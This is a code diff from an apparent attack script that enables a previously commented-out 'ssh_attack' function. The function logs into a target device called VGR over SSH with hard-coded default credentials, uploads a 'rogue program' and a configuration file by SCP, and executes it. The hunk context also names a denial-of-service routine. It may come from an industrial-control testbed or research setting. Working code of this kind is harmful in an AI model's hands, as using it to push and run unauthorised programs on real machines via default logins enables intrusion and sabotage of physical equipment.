@@ -101,33 +101,33 @@ async def dos_leg_clients(client):
 
 async def ssh_attack():
     await asyncio.sleep(random.randint(27, 35))
-    #
-    # # supress logging info from paramiko
-    # logging.getLogger("paramiko").setLevel(logging.WARNING)
-    #
-    # logger.info("Starting file upload attack on target VGR")
-    # server = VGR_IP
-    # port = VGR_PORT
-    # username = password = 'ROBOPro'
-    #
-    # # create ssh object and connect
-    # ssh = SSHClient()
-    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
-    # ssh.set_missing_host_key_policy(AutoAddPolicy)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    #
-    # # hijack the established tcp/ssh connection and copy files
-    # scp = SCPClient(ssh.get_transport())
-    # path = os.getcwd()
-    # # now copy the rogue program
-    # scp.put(f'{os.getcwd()}/TxtParkPosVGR', '.')
-    # scp.put(f'{os.getcwd()}/Config.ParkPos.json', 'Data/')
-    #
-    # # now run the rogue program
-    # ssh.exec_command('./TxtParkPosVGR')
-    # # time.sleep(2)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    # ssh.exec_command('./TxtParkPosVGR')
+
+    # supress logging info from paramiko
+    logging.getLogger("paramiko").setLevel(logging.WARNING)
+
+    logger.info("Starting file upload attack on target VGR")
+    server = VGR_IP
+    port = VGR_PORT
+    username = password = 'ROBOPro'
+
+    # create ssh object and connect
+    ssh = SSHClient()
+    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
+    ssh.set_missing_host_key_policy(AutoAddPolicy)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+
+    # hijack the established tcp/ssh connection and copy files
+    scp = SCPClient(ssh.get_transport())
+    path = os.getcwd()
+    # now copy the rogue program
+    scp.put(f'{os.getcwd()}/TxtParkPosVGR', '.')
+    scp.put(f'{os.getcwd()}/Config.ParkPos.json', 'Data/')
+
+    # now run the rogue program
+    ssh.exec_command('./TxtParkPosVGR')
+    # time.sleep(2)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    ssh.exec_command('./TxtParkPosVGR')
     logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")
 
 
